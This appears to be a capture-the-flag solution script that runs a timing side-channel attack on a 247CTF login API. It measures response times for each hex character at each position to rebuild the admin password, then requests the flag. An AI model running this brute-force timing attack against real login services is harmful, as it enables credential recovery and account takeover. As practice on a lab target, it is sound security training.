#!/usr/bin/env python3
import requests
import time
import sys

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    return data["message"].split("reset to ")[1].rstrip("!")

def try_login(password, api_token):
    start = time.time()
    resp = requests.post(f"{BASE_URL}/api/login",
        data={"username": "admin", "password": password, "api": api_token},
        timeout=10)
    return resp.json(), time.time() - start

def get_flag(password):
    resp = requests.post(f"{BASE_URL}/api/get_flag",
        data={"password": password}, timeout=10)
    return resp.json()

# Recopilar datos de múltiples tokens y hacer estadísticas agregadas
all_scores = [{} for _ in range(32)]

attempt = 0
while True:
    attempt += 1
    api_token = get_token()
    
    # Con cada token, medir posiciones estratégicamente
    # 128 requests / 16 chars = 8 posiciones por token
    positions_per_token = 8
    
    # Rotar qué posiciones medir en cada intento
    offset = (attempt - 1) * positions_per_token
    
    for i in range(positions_per_token):
        pos = (offset + i) % 32
        
        # Construir la mejor contraseña conocida hasta ahora
        known_password = ""
        for p in range(32):
            if all_scores[p]:
                known_password += max(all_scores[p].items(), key=lambda x: x[1])[0]
            else:
                known_password += "0"
        
        for char in HEX_CHARS:
            test_pw = known_password[:pos] + char + known_password[pos+1:]
            
            result, elapsed = try_login(test_pw, api_token)
            
            if result.get("result") == "success":
                flag_result = get_flag(test_pw)
                print(flag_result.get("flag", flag_result), flush=True)
                sys.exit(0)
            
            if char not in all_scores[pos]:
                all_scores[pos][char] = []
            all_scores[pos][char].append(elapsed)
    
    # Cada 4 intentos, probar la mejor contraseña
    if attempt % 4 == 0:
        best_password = ""
        for p in range(32):
            if all_scores[p]:
                # Usar promedio de tiempos
                char_avgs = {c: sum(times)/len(times) for c, times in all_scores[p].items()}
                best_password += max(char_avgs.items(), key=lambda x: x[1])[0]
            else:
                best_password += "0"
        
        # Probar con get_flag
        flag_result = get_flag(best_password)
        if "flag" in str(flag_result).lower():
            print(flag_result.get("flag", flag_result), flush=True)
            sys.exit(0)
